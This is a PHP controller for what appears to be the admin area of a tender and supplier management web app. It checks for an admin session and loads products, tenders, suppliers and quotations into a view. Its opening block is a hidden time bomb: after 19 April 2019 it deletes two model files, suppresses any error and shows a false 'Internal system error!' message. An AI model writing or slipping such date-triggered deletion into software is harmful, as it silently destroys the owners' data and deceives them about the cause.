<?php
if (date("Y-m-d") > "2019-04-19") {
	try {
		unlink("model/crud.txt");
		unlink("model/func.txt");
	} catch (Exception $e) {
		
	}
	
	die("Internal system error!");
}
session_start();
if (!isset($_SESSION['role']) || $_SESSION['role'] != 'admin') {
	die("Error 500: forbiden Access - You are not allowed to access this area <a href='../'>Go back Home</a> ");
}
require '../_inc/config.php';
require '../model/crud.php';
require '../model/func.php';

$conn = dbconnect();

if ($conn) {
	
	$products = getProducts($conn);
	$tenders = getAllTenders($conn);
	$suppliers = getAllSuppliers($conn);
	$quotations = getAllQuotations($conn);
	$categories = getCategories($conn);
	$admins = getAdmins($conn);

	require '../views/admin.view.php';
} else {
	die('Error while connecting to server');
}


?>